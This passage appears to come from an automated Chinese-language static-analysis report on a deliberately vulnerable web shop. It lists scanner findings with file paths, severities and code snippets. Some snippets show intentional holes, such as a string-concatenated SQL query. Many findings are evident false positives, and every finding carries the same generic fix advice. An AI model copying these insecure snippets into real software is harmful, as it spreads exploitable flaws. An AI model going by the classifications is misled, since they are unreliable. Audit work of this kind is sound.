- 文件：`C:\Users\52697\Desktop\2026小学期\AuditAgentX\data\projects\proj_27e19404\routes\fileServer.ts:33`
- 来源：semgrep
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
requires login
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.246 express-res-sendfile（MEDIUM）

- 文件：`C:\Users\52697\Desktop\2026小学期\AuditAgentX\data\projects\proj_27e19404\routes\keyServer.ts:14`
- 来源：semgrep
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
requires login
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.247 express-res-sendfile（MEDIUM）

- 文件：`C:\Users\52697\Desktop\2026小学期\AuditAgentX\data\projects\proj_27e19404\routes\logfileServer.ts:14`
- 来源：semgrep
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
requires login
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.248 express-res-sendfile（MEDIUM）

- 文件：`C:\Users\52697\Desktop\2026小学期\AuditAgentX\data\projects\proj_27e19404\routes\quarantineServer.ts:14`
- 来源：semgrep
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
requires login
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.249 express-open-redirect（MEDIUM）

- 文件：`C:\Users\52697\Desktop\2026小学期\AuditAgentX\data\projects\proj_27e19404\routes\redirect.ts:19`
- 来源：semgrep
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
requires login
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.250 eval-detected（MEDIUM）

- 文件：`C:\Users\52697\Desktop\2026小学期\AuditAgentX\data\projects\proj_27e19404\routes\userProfile.ts:61`
- 来源：semgrep
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
requires login
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.251 unknown-value-with-script-tag（MEDIUM）

- 文件：`C:\Users\52697\Desktop\2026小学期\AuditAgentX\data\projects\proj_27e19404\routes\videoHandler.ts:57`
- 来源：semgrep
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
requires login
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.252 unknown-value-with-script-tag（MEDIUM）

- 文件：`C:\Users\52697\Desktop\2026小学期\AuditAgentX\data\projects\proj_27e19404\routes\videoHandler.ts:71`
- 来源：semgrep
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
requires login
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.253 express-check-directory-listing（MEDIUM）

- 文件：`C:\Users\52697\Desktop\2026小学期\AuditAgentX\data\projects\proj_27e19404\server.ts:269`
- 来源：semgrep
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
requires login
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.254 express-check-directory-listing（MEDIUM）

- 文件：`C:\Users\52697\Desktop\2026小学期\AuditAgentX\data\projects\proj_27e19404\server.ts:273`
- 来源：semgrep
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
requires login
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.255 express-check-directory-listing（MEDIUM）

- 文件：`C:\Users\52697\Desktop\2026小学期\AuditAgentX\data\projects\proj_27e19404\server.ts:277`
- 来源：semgrep
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
requires login
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.256 express-check-directory-listing（MEDIUM）

- 文件：`C:\Users\52697\Desktop\2026小学期\AuditAgentX\data\projects\proj_27e19404\server.ts:281`
- 来源：semgrep
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
requires login
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.257 template-explicit-unescape（MEDIUM）

- 文件：`C:\Users\52697\Desktop\2026小学期\AuditAgentX\data\projects\proj_27e19404\views\promotionVideo.pug:75`
- 来源：semgrep
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
requires login
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.258 XSS（MEDIUM）

- 文件：`Gruntfile.js:20`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
'engines.node': (node || '<%= pkg.engines.node %>'),
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.259 XSS（MEDIUM）

- 文件：`Gruntfile.js:21`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
os: (os ? [os] : '<%= pkg.os %>'),
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.260 XSS（MEDIUM）

- 文件：`Gruntfile.js:22`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
cpu: (platform ? [platform] : '<%= pkg.cpu %>')
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.261 Weak Hash（MEDIUM）

- 文件：`Gruntfile.js:75`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
const md5 = crypto.createHash('md5')
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.262 Weak Randomness（MEDIUM）

- 文件：`data/datacreator.ts:305`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
for (let i = 0; i < length; i++) { text += possible.charAt(Math.floor(Math.random() * possible.length)) }
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.263 Weak Randomness（MEDIUM）

- 文件：`data/datacreator.ts:323`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
quantity: product.quantity ?? Math.floor(Math.random() * 70 + 30),
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.264 Weak Randomness（MEDIUM）

- 文件：`data/datacreator.ts:381`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
product.price = product.price ?? Math.floor(Math.random() * 9 + 1)
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.265 Weak Randomness（MEDIUM）

- 文件：`data/datacreator.ts:755`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
eta: Math.floor((Math.random() * 5) + 1).toString(),
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.266 Weak Randomness（MEDIUM）

- 文件：`frontend/src/app/chatbot/chat-welcome-screen/chat-welcome-screen.component.ts:71`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
const chosen = availableSuggestions[Math.floor(Math.random() * availableSuggestions.length)]
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.267 Weak Randomness（MEDIUM）

- 文件：`frontend/src/app/coding-challenge-page/components/coding-challenge-fix-it/coding-challenge-fix-it.component.ts:119`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
.map((fix, index) => ({ fix, index, sort: Math.random() }))
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.268 Weak Randomness（MEDIUM）

- 文件：`frontend/src/app/Services/conversation-storage.service.ts:17`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
const random8 = Array.from({ length: 8 }, () => chars[Math.floor(Math.random() * chars.length)]).join('')
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.269 XSS（MEDIUM）

- 文件：`frontend/src/assets/private/dat.gui.min.js:23`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
dat.controllers.FunctionController=function(e,a,b){var d=function(b,c,e){d.superclass.call(this,b,c);var k=this;this.__button=document.createElement("div");this.__button.innerHTML=void 0===e?"Fire":e;
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.270 XSS（MEDIUM）

- 文件：`frontend/src/assets/private/dat.gui.min.js:33`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
dat.GUI=dat.gui.GUI=function(e,a,b,d,f,c,p,k,l,q,n,r,y,g,h){function t(a,c,b,e){if(void 0===c[b])throw Error("Object "+c+' has no property "'+b+'"');e.color?c=new n(c,b):(c=[c,b].concat(e.factoryArgs)
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.271 XSS（MEDIUM）

- 文件：`frontend/src/assets/private/dat.gui.min.js:35`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
{before:b.__li.nextElementSibling,factoryArgs:[d]})},name:function(a){b.__li.firstElementChild.firstElementChild.innerHTML=a;return b},listen:function(){b.__gui.listen(b);return b},remove:function(){b
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.272 XSS（MEDIUM）

- 文件：`frontend/src/assets/private/dat.gui.min.js:39`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
a.__ul.firstChild);g.addClass(b,"save-row");var d=document.createElement("span");d.innerHTML="&nbsp;";g.addClass(d,"button gears");var c=document.createElement("span");c.innerHTML="Save";g.addClass(c,
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.273 XSS（MEDIUM）

- 文件：`frontend/src/assets/private/dat.gui.min.js:40`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
a.load.remembered?h.each(a.load.remembered,function(b,d){E(a,d,d==a.preset)}):E(a,z,!1);g.bind(q,"change",function(){for(var b=0;b<a.__preset_select.length;b++)a.__preset_select[b].innerHTML=a.__prese
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.274 XSS（MEDIUM）

- 文件：`frontend/src/assets/private/dat.gui.min.js:41`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
localStorage.getItem(document.location.href+".isLocal")&&b.setAttribute("checked","checked");var k=function(){n.style.display=a.useLocalStorage?"block":"none"};k();g.bind(b,"change",function(){a.useLo
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.275 XSS（MEDIUM）

- 文件：`frontend/src/assets/private/dat.gui.min.js:44`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
function B(a,b){var d={};h.each(a.__rememberedObjects,function(c,e){var f={};h.each(a.__rememberedObjectIndecesToControllers[e],function(a,d){f[d]=b?a.initialValue:a.getValue()});d[e]=f});return d}fun
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.276 XSS（MEDIUM）

- 文件：`frontend/src/assets/private/dat.gui.min.js:48`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
b);c.revert()}},width:{get:function(){return a.width},set:function(b){a.width=b;F(c,b)}},name:{get:function(){return a.name},set:function(b){a.name=b;q&&(q.innerHTML=a.name)}},closed:{get:function(){r
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.277 XSS（MEDIUM）

- 文件：`frontend/src/assets/private/dat.gui.min.js:49`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
((e=a)?g.bind(window,"unload",b):g.unbind(window,"unload",b),localStorage.setItem(document.location.href+".isLocal",a))}}});if(h.isUndefined(a.parent)){a.closed=!1;g.addClass(this.domElement,m.CLASS_M
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.278 XSS（MEDIUM）

- 文件：`frontend/src/assets/private/dat.gui.min.js:55`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
b-20+"px"):(g.removeClass(a.domElement,m.CLASS_TOO_TALL),a.__ul.style.height="auto")}a.__resize_handle&&h.defer(function(){a.__resize_handle.style.height=a.__ul.offsetHeight+"px"});a.__closeButton&&(a
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.279 Weak Randomness（MEDIUM）

- 文件：`frontend/src/assets/private/three.js:6359`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
if (rnd <= 0x02) rnd = 0x2000000 + (Math.random()*0x1000000)|0;
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.280 Weak Randomness（MEDIUM）

- 文件：`frontend/src/assets/private/three.js:6422`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
// (standard Math.random() creates repetitive patterns when applied over larger space)
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.281 Weak Randomness（MEDIUM）

- 文件：`frontend/src/assets/private/three.js:6426`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
return ( 65280 * Math.random() + 255 * Math.random() ) / 65535;
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.282 Weak Randomness（MEDIUM）

- 文件：`frontend/src/assets/private/three.js:6434`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
return low + Math.floor( Math.random() * ( high - low + 1 ) );
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.283 Weak Randomness（MEDIUM）

- 文件：`frontend/src/assets/private/three.js:6442`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
return low + Math.random() * ( high - low );
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.284 Weak Randomness（MEDIUM）

- 文件：`frontend/src/assets/private/three.js:6450`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
return range * ( 0.5 - Math.random() );
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.285 Weak Randomness（MEDIUM）

- 文件：`frontend/src/assets/private/three.js:15504`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
this.material = material !== undefined ? material : new THREE.ParticleSystemMaterial( { color: Math.random() * 0xffffff } );
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.286 Weak Randomness（MEDIUM）

- 文件：`frontend/src/assets/private/three.js:15534`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
this.material = material !== undefined ? material : new THREE.LineBasicMaterial( { color: Math.random() * 0xffffff } );
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.287 Weak Randomness（MEDIUM）

- 文件：`frontend/src/assets/private/three.js:15567`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
this.material = material !== undefined ? material : new THREE.MeshBasicMaterial( { color: Math.random() * 0xffffff } );
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.288 Weak Hash（MEDIUM）

- 文件：`lib/insecurity.ts:41`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
export const hash = (data: string) => crypto.createHash('md5').update(data).digest('hex')
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.289 Weak Randomness（MEDIUM）

- 文件：`lib/insecurity.ts:53`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
export const denyAll = () => expressJwt({ secret: '' + Math.random() } as any)
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.290 SSRF（MEDIUM）

- 文件：`lib/startup/validatePreconditions.ts:236`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
const response = await fetch(`${llmApiUrl}/models`, { signal: AbortSignal.timeout(5000) })
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.291 Command Injection（MEDIUM）

- 文件：`routes/b2bOrder.ts:23`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
vm.runInContext('safeEval(orderLinesData)', sandbox, { timeout: 2000 })
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.292 Weak Randomness（MEDIUM）

- 文件：`routes/captcha.ts:14`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
const firstTerm = Math.floor((Math.random() * 10) + 1)
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.293 Weak Randomness（MEDIUM）

- 文件：`routes/captcha.ts:15`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
const secondTerm = Math.floor((Math.random() * 10) + 1)
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.294 Weak Randomness（MEDIUM）

- 文件：`routes/captcha.ts:16`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
const thirdTerm = Math.floor((Math.random() * 10) + 1)
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.295 Weak Randomness（MEDIUM）

- 文件：`routes/captcha.ts:18`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
const firstOperator = operators[Math.floor((Math.random() * 3))]
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.296 Weak Randomness（MEDIUM）

- 文件：`routes/captcha.ts:19`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
const secondOperator = operators[Math.floor((Math.random() * 3))]
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.297 XSS（MEDIUM）

- 文件：`routes/chat.ts:218`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
res.write(`data: ${JSON.stringify({ choices: [{ delta: { content: event.text } }] })}\n\n`)
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.298 XSS（MEDIUM）

- 文件：`routes/chat.ts:228`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
res.write(`data: ${JSON.stringify({
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.299 SQL Injection（MEDIUM）

- 文件：`routes/search.ts:23`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
models.sequelize.query(`SELECT * FROM Products WHERE ((name LIKE '%${criteria}%' OR description LIKE '%${criteria}%') AND deletedAt IS NULL) ORDER BY name`) // vuln-code-snippet vuln-line unionSqlInje
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.300 Path Traversal（MEDIUM）

- 文件：`routes/vulnCodeSnippet.ts:90`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
const codingChallengeInfos = yaml.load(await fs.readFile('./data/static/codefixes/' + key + '.info.yml', { encoding: 'utf8' }))
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.301 detect-replaceall-sanitization（LOW）

- 文件：`C:\Users\52697\Desktop\2026小学期\AuditAgentX\data\projects\proj_27e19404\data\static\codefixes\restfulXssChallenge_2.ts:46`
- 来源：semgrep
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
requires login
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.302 unsafe-formatstring（LOW）

- 文件：`C:\Users\52697\Desktop\2026小学期\AuditAgentX\data\projects\proj_27e19404\server.ts:157`
- 来源：semgrep
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
requires login
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.303 XSS（LOW）

- 文件：`Gruntfile.js:31`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
archive: 'dist/<%= pkg.name %>-<%= pkg.version %>' + (node ? ('_node' + node) : '') + (os ? ('_' + os) : '') + (platform ? ('_' + platform) : '') + (os === 'linux' ? '.tgz' : '.zip')
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.304 XSS（LOW）

- 文件：`Gruntfile.js:63`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
dest: 'juice-shop_<%= pkg.version %>/'
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.305 Path Traversal（LOW）

- 文件：`data/staticData.ts:9`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
return await readFile(filePath, 'utf8')
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.306 Path Traversal（LOW）

- 文件：`data/static/codefixes/nftUnlockChallenge_1.sol:27`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
require(from == address(0) || to == address(0), "Err: token transfer is BLOCKED");
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.307 Path Traversal（LOW）

- 文件：`frontend/src/app/accounting/accounting.component.ts:130`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
this.snackBarHelperService.open(`Quantity for ${product.name} has been updated.`, 'confirmBar')
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.308 Path Traversal（LOW）

- 文件：`frontend/src/app/accounting/accounting.component.ts:144`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
this.snackBarHelperService.open(`Price for ${product.name} has been updated.`, 'confirmBar')
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.309 Path Traversal（LOW）

- 文件：`frontend/src/app/complaint/complaint.component.spec.ts:134`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
component.uploader.queue[0] = new FileItem(component.uploader, new File([''], 'file.pdf', { type: 'application/pdf' }), { url: '' })
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.310 Path Traversal（LOW）

- 文件：`frontend/src/app/navbar/navbar.component.ts:258`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
const snackBarRef = this.snackBar.open(`Language has been changed to ${language.lang}`, 'Force page reload', {
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.311 Path Traversal（LOW）

- 文件：`frontend/src/app/order-completion/order-completion.component.ts:98`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
window.open(redirectUrl, '_blank')
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.312 Path Traversal（LOW）

- 文件：`frontend/src/app/order-history/order-history.component.ts:115`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
window.open(redirectUrl, '_blank')
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.313 XSS（LOW）

- 文件：`frontend/src/app/score-board/components/challenge-card/challenge-card.component.spec.ts:242`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
expect(compiled.querySelector('.description-row')?.innerHTML).toContain('<b>boom</b>')
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.314 SSRF（LOW）

- 文件：`frontend/src/app/Services/address.service.ts:26`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
return this.http.get(`${this.host}/${id}`).pipe(map((response: any) => response.data), catchError((err: Error) => { throw err }))
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.315 SSRF（LOW）

- 文件：`frontend/src/app/Services/address.service.ts:30`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
return this.http.post(this.host + '/', params).pipe(map((response: any) => response.data), catchError((err) => { throw err }))
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.316 SSRF（LOW）

- 文件：`frontend/src/app/Services/administration.service.ts:21`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
return this.http.get(this.host + '/application-version').pipe(
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.317 SSRF（LOW）

- 文件：`frontend/src/app/Services/basket.service.ts:36`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
return this.http.get(`${this.hostServer}/rest/basket/${id}`).pipe(map((response: any) => response.data), catchError((error) => { throw error }))
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.318 SSRF（LOW）

- 文件：`frontend/src/app/Services/basket.service.ts:40`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
return this.http.get(`${this.host}/${id}`).pipe(map((response: any) => response.data), catchError((error) => { throw error }))
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.319 SSRF（LOW）

- 文件：`frontend/src/app/Services/basket.service.ts:52`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
return this.http.post(this.host + '/', params).pipe(map((response: any) => response.data), catchError((error) => { throw error }))
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.320 SSRF（LOW）

- 文件：`frontend/src/app/Services/basket.service.ts:56`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
return this.http.post(`${this.hostServer}/rest/basket/${id}/checkout`, { couponData, orderDetails }).pipe(map((response: any) => response.orderConfirmation), catchError((error) => { throw error }))
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.321 SSRF（LOW）

- 文件：`frontend/src/app/Services/captcha.service.ts:21`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
return this.http.get(this.host + '/').pipe(catchError((err) => { throw err }))
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.322 SSRF（LOW）

- 文件：`frontend/src/app/Services/challenge.service.ts:23`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
return this.http.get(this.host + '/', { params }).pipe(map((response: any) => response.data), catchError((err) => { throw err }))
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.323 SSRF（LOW）

- 文件：`frontend/src/app/Services/challenge.service.ts:27`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
return this.http.get(this.hostServer + '/rest/repeat-notification', { params: { challenge: challengeName }, responseType: 'text' as const }).pipe(catchError((err) => { throw err }))
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.324 SSRF（LOW）

- 文件：`frontend/src/app/Services/challenge.service.ts:31`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
return this.http.get(this.hostServer + '/rest/continue-code').pipe(map((response: any) => response.continueCode), catchError((err) => { throw err }))
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.325 SSRF（LOW）

- 文件：`frontend/src/app/Services/challenge.service.ts:35`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
return this.http.get(this.hostServer + '/rest/continue-code-findIt').pipe(map((response: any) => response.continueCode), catchError((err) => { throw err }))
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




